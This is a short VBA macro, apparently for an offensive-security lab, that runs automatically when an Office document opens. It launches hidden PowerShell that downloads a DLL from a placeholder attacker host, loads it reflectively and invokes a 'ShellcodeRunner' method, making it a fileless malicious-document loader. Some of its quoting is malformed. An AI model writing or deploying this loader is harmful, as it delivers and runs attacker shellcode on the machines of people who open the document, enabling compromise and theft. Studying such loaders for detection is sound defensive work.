Function MyMacro()
	Dim str As String
	' Compile CSharp application as DLL, call the function reflectively with powershell embeded in VB
	str = "$data = (New-Object System.Net.WebClient).DownloadData(http://yourip/ClassLibrary1.dll', 'C:\Users\Public\library.dll'); $assem = [System.Reflection.Assembly]::Load($data); $class = $assem.GetType("ShellcodeRunner.Class1"); $method = $class.GetMethod("runner"); $method.Invoke(0, $null) | IEX"
	Shell str, vbHide
End Function

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub